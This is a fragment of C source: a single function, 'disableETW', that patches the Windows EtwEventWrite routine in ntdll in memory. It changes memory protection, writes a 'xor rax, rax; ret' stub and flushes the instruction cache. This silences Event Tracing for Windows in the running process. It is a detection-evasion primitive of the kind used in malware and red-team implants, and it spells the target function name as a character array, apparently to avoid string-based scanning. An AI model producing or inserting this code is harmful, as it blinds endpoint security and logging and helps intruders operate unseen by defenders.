void disableETW(void) {
	unsigned char patch[] = { 0x48, 0x33, 0xc0, 0xc3};     // xor rax, rax; ret
	ULONG oldprotect = 0;
	size_t size = sizeof(patch);
	HANDLE hCurrentProc = GetCurrentProcess();
	unsigned char sEtwEventWrite[] = { 'E','t','w','E','v','e','n','t','W','r','i','t','e', 0x0 };
	void *pEventWrite = GetProcAddress(GetModuleHandle((LPCSTR) sNtdll), (LPCSTR) sEtwEventWrite);
	NtProtectVirtualMemory(hCurrentProc, &pEventWrite, (PSIZE_T) &size, PAGE_READWRITE, &oldprotect);
	memcpy(pEventWrite, patch, size / sizeof(patch[0]));
	NtProtectVirtualMemory(hCurrentProc, &pEventWrite, (PSIZE_T) &size, oldprotect, &oldprotect);
	FlushInstructionCache(hCurrentProc, pEventWrite, size);
}